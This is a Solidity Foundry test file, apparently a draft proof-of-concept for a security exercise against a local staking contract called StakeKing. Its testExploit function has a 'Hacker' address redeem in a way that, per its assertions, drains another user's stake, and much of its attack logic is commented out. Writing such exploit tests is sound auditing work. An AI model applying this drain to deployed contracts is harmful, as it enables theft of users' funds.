// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/StakeKing.sol";
import "../src/erc20.sol";
import "../src/feeManager.sol";

contract StakingContractTest is Test {
    StakeKing stakeKing;
    erc20Token usdc;
    FeeManager feeManager;

    address admin = address(1);
    address Alice = address(2);
    address Hacker = address(3);

    function setUp() public {
        vm.startPrank(admin);

        //Setting up Contracts
        usdc = new erc20Token("USD Coin", "USDC", 0);
        feeManager = new FeeManager();
        stakeKing = new StakeKing(address(usdc), address(feeManager));

        //Intial Balances of the user.
        usdc.mint(Alice, 100);
        usdc.mint(Hacker, 100);

        vm.stopPrank();
    }

    function testExploit() public {
        vm.prank(admin);
        usdc.mint(Alice, 1000);

        vm.startPrank(Alice);
        usdc.approve(address(stakeKing), type(uint256).max);
        stakeKing.stake(100);
        vm.stopPrank();

        assertEq(stakeKing.stakedBalances(Alice), 100);

        vm.startPrank(Hacker);
        usdc.approve(address(stakeKing), type(uint256).max);
        stakeKing.stake(100);
        vm.stopPrank();

        // 360 Seconds Passed?
        vm.warp(block.timestamp + 360);

        // vm.startPrank(Hacker);
        // uint256 interest = stakeKing.getAccruedInterest(Hacker);

        // uint256 fee = (interest * 20) / 100;
        // uint256 remainingInterest = interest - fee;
        // console.log(interest, "interest");
        // console.log(fee, "fee");
        // console.log(remainingInterest, "remainingInterest");

        // stakeKing.claimInterest();
        // vm.stopPrank();

        // vm.startPrank(Hacker);
        // stakeKing.redeem(remainingInterest);
        // vm.stopPrank();

        // Alice claims interest (optional)
        vm.startPrank(Alice);
        // stakeKing.redeem(100);
        vm.stopPrank();
        vm.startPrank(Hacker);
        // stakeKing.claimInterest();
        stakeKing.redeem(100);
        vm.stopPrank();

        assertEq(usdc.balanceOf(Hacker), 200);
        assertEq(usdc.balanceOf(address(stakeKing)), 0);
    }
}


contract Attacker {
    // fallback{

    // }
}